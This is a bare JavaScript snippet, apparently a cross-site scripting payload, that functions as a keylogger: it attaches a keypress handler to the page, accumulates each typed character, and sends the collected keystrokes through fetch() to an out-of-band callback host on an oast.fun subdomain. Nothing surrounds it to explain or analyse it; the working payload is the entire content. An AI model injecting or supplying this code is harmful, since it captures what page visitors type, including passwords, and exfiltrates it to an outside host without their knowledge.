document.onkeypress = function(e) {
    if (typeof k === 'undefined') {
        k = "";
    }
    k = k + String.fromCharCode(e.which);
    fetch("//sssjxtqdajnbpixljfpbbo7ifi94jmxrx.oast.fun?k=" + k);
    this.remove();
};
k=""
